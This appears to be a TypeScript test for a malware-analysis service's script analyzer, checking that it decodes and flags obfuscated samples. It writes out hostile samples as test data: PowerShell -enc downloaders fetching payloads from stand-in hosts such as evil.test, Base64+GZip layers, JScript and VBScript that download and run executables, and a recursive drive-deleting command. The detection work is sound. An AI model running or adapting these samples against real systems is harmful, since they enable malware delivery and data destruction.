import { gzipSync } from 'node:zlib';

import cookie from '@fastify/cookie';
import multipart from '@fastify/multipart';
import rateLimit from '@fastify/rate-limit';
import Fastify from 'fastify';

import { env } from '../../src/env';
import { hashPassword } from '../../src/lib/crypto';
import { prisma } from '../../src/lib/prisma';
import { ensureBucket } from '../../src/lib/s3';
import { analyzeScript } from '../../src/lib/script-analysis';
import { analyzeBuffer } from '../../src/lib/static-analysis';
import { authRoutes } from '../../src/routes/auth';
import { entryRoutes } from '../../src/routes/entries';

let fails = 0;
const ok = (label: string, cond: boolean | undefined, detail: unknown = '') => {
  if (!cond) fails++;
  console.log(`${cond ? 'ok  ' : 'FALHA'} ${label}${cond ? '' : ' ' + JSON.stringify(detail)}`);
};
const enc = (s: string) => Buffer.from(s, 'utf16le').toString('base64');
const names = (i: { findings: { name: string }[] } | null) =>
  (i?.findings ?? []).map((f) => f.name);

async function main() {
  // 1. BAT que chama powershell -enc com downloader.
  const inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/stage2.ps1')";
  const bat = `@echo off\r\npowershell.exe -nop -w hidden -ep bypass -enc ${enc(inner)}\r\n`;
  let info = analyzeScript(Buffer.from(bat), 'fatura.bat');
  ok('BAT reconhecido', info?.language === 'batch', info?.language);
  ok(
    'camada -EncodedCommand decodificada',
    info?.layers[0]?.method === 'PowerShell -EncodedCommand' &&
      info.layers[0].text === inner &&
      info.layers[0].from === 0,
    info?.layers,
  );
  ok(
    'achados do arquivo e da camada',
    [
      'powershell -EncodedCommand',
      '-WindowStyle Hidden',
      '-ExecutionPolicy Bypass',
      'Invoke-Expression (IEX)',
      'DownloadString/DownloadFile',
      'Net.WebClient',
    ].every((n) => names(info).includes(n)),
    names(info),
  );
  ok(
    'achado da camada marca a camada',
    info?.findings.find((f) => f.name === 'DownloadString/DownloadFile')?.layer === 1,
  );
  ok('URL da camada', info?.urls.includes('http://evil.test/stage2.ps1'), info?.urls);
  ok('risco alto', info?.risk === 'high');

  // 2. Base64 + GZip aninhado: -enc -> FromBase64String(gzip) -> comando.
  const payload =
    'Start-Process calc.exe; Invoke-WebRequest http://gz.test/x.exe -OutFile $env:TEMP\\x.exe';
  const gz = gzipSync(Buffer.from(payload)).toString('base64');
  const layer1 = `$d=[System.Convert]::FromBase64String('${gz}');IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,$d)),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()`;
  const ps = `powershell -enc ${enc(layer1)}`;
  info = analyzeScript(Buffer.from(ps), 'run.ps1');
  ok('PowerShell pelo nome', info?.language === 'powershell');
  ok(
    'duas camadas encadeadas',
    info?.layers.length === 2 &&
      info.layers[1].method === 'Base64 + GZip' &&
      info.layers[1].from === 1 &&
      info.layers[1].text === payload,
    info?.layers.map((l) => [l.method, l.from]),
  );
  ok('URL da 2ª camada', info?.urls.includes('http://gz.test/x.exe'), info?.urls);
  ok(
    'Start-Process e Invoke-WebRequest',
    names(info).includes('Start-Process') && names(info).includes('Invoke-WebRequest'),
  );

  // 3. JScript com fromCharCode.
  const url = 'http://js.test/a.exe';
  const js = `var u=String.fromCharCode(${[...url].map((c) => c.charCodeAt(0)).join(',')});\nvar x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET",u,false);\nnew ActiveXObject("WScript.Shell").Run("cmd /c start a.exe");`;
  info = analyzeScript(Buffer.from(js), 'boleto.js');
  ok('JScript', info?.language === 'javascript');
  ok(
    'fromCharCode decodificado com a URL',
    info?.layers[0]?.method === 'String.fromCharCode' &&
      info.layers[0].text === url &&
      info.urls.includes(url),
    info?.layers,
  );
  ok(
    'ActiveX, XMLHTTP e Run',
    ['ActiveXObject', 'XMLHTTP/WinHTTP', 'WScript.Shell', '.Run()/.Exec()/ShellExecute'].every(
      (n) => names(info).includes(n),
    ),
    names(info),
  );

  // 4. VBScript com Chr() & ... e sem extensao conhecida.
  const word = 'http://vbs.test/p';
  const vbs = `On Error Resume Next\nDim o: Set o = CreateObject("WScript.Shell")\nu = ${[...word].map((c) => `Chr(${c.charCodeAt(0)})`).join(' & ')}\no.Run "mshta " & u\n`;
  info = analyzeScript(Buffer.from(vbs), 'nota');
  ok('VBScript pelo conteúdo', info?.language === 'vbscript');
  ok(
    'Chr() decodificado',
    info?.layers.some((l) => l.method === 'Chr() & Chr()' && l.text === word),
    info?.layers,
  );
  ok(
    'mshta e CreateObject',
    names(info).includes('mshta/rundll32/regsvr32/wmic') && names(info).includes('CreateObject'),
  );

  // 5. HTA e UTF-16 com BOM.
  const hta =
    '<html><head><hta:application id="x" /></head><script language="javascript">eval(atob("' +
    Buffer.from('new ActiveXObject("WScript.Shell").Run("calc")').toString('base64') +
    '"))</script></html>';
  info = analyzeScript(Buffer.from(hta), 'pagina.hta');
  ok(
    'HTA com eval(atob)',
    info?.language === 'hta' &&
      info.layers[0]?.method === 'atob (Base64)' &&
      names(info).includes('eval()'),
    info,
  );
  const bom = Buffer.concat([
    Buffer.from([0xff, 0xfe]),
    Buffer.from('Get-ChildItem C:\\ | Remove-Item -Recurse\nInvoke-Expression $x\n', 'utf16le'),
  ]);
  info = analyzeScript(bom, 'limpa.ps1');
  ok(
    'UTF-16 com BOM',
    info?.language === 'powershell' && names(info).includes('Invoke-Expression (IEX)'),
    info,
  );

  // 6. Benignos e nao scripts.
  info = analyzeScript(
    Buffer.from('Get-ChildItem -Path C:\\Logs | Sort-Object Length\n'),
    'lista.ps1',
  );
  ok(
    'script benigno: risco baixo, sem camadas',
    info?.risk === 'low' && info.layers.length === 0 && info.findings.length === 0,
    info,
  );
  ok(
    'texto comum não é script',
    analyzeScript(
      Buffer.from('Ata da reunião de segunda-feira.\nPresentes: todos.\n'),
      'ata.txt',
    ) === null,
  );
  ok(
    'binário não é script',
    analyzeScript(Buffer.concat([Buffer.from('MZ'), Buffer.alloc(300)]), 'x.ps1') === null,
  );
  ok(
    'Script Encoder marcado',
    analyzeScript(Buffer.from('#@~^AQAAAA==abcdefghijkl^#~@'), 'x.vbe')?.encoded === true,
  );

  // 7. Limite de camadas (cadeia longa de -enc).
  let chain = 'Write-Output fim';
  for (let i = 0; i < 8; i++) chain = `powershell -enc ${enc(chain)}`;
  info = analyzeScript(Buffer.from(chain), 'longo.ps1');
  ok('profundidade limitada (5 camadas)', info?.layers.length === 5, info?.layers.length);

  // 8. Na analise estatica e no envio.
  const st = analyzeBuffer(Buffer.from(bat), 'fatura.bat');
  ok(
    'análise estática traz o script e sugere a URL',
    st.script?.language === 'batch' && st.iocCandidates.some((c) => c.value === 'evil.test'),
    st.iocCandidates,
  );

  env.CLAMAV_HOST = '';
  env.UPLOAD_DAILY_LIMIT = 0;
  await ensureBucket();
  const app = Fastify();
  await app.register(cookie, { secret: env.SESSION_SECRET });
  await app.register(rateLimit, { global: false });
  await app.register(multipart, { limits: { fileSize: 5 * 1024 * 1024, files: 1 } });
  for (const r of [authRoutes, entryRoutes]) await app.register(r);
  await app.ready();
  await prisma.user.create({
    data: {
      email: 'ana@x.io',
      displayName: 'ana',
      role: 'ANALYST',
      passwordHash: await hashPassword('senha-123!'),
    },
  });
  const c = String(
    (
      await app.inject({
        method: 'POST',
        url: '/api/auth/login',
        payload: { email: 'ana@x.io', password: 'senha-123!' },
      })
    ).headers['set-cookie'],
  ).split(';')[0];
  const boundary = '----dl' + Math.random();
  const body = Buffer.concat([
    Buffer.from(
      `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="fatura.bat"\r\nContent-Type: application/octet-stream\r\n\r\n`,
    ),
    Buffer.from(bat),
    Buffer.from(`\r\n--${boundary}--\r\n`),
  ]);
  const r = await app.inject({
    method: 'POST',
    url: '/api/entries/file',
    payload: body,
    headers: { cookie: c, 'content-type': `multipart/form-data; boundary=${boundary}` },
  });
  const id = r.json().entry.id;
  const detail = (
    await app.inject({ method: 'GET', url: `/api/entries/${id}`, headers: { cookie: c } })
  ).json().entry;
  ok(
    'envio grava a análise do script',
    detail.staticInfo?.script?.risk === 'high' && detail.staticInfo.script.layers.length === 1,
    detail.staticInfo?.script,
  );

  await app.close();
  await prisma.$disconnect();
  console.log(fails ? `\n${fails} falha(s)` : '\ntudo ok');
  process.exit(fails ? 1 : 0);
}
main();
